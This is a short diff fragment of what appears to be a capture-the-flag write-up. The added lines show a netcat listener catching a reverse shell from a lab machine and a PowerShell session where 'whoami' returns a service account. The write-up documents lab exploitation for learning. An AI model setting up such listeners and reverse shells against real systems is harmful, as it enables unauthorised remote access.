@@ -747,7 +747,18 @@ And after trying a bunch of different things found in my research i get RCE
 Ill grab a reverse shell from revshells and on my listener
 
 ```python
+❯❯ rlwrap nc -lnvp 1337
+listening on [any] 1337 ...
+connect to [10.10.14.61] from (UNKNOWN) [10.129.245.56] 52945
 
+PS C:\Users\Pong_gMSA$\Documents> 
+PS C:\Users\Pong_gMSA$\Documents> whoami
+pong\pong_gmsa$
+PS C:\Users\Pong_gMSA$\Documents> 
 ```
+
+I now have a full shell
+
+
 
 
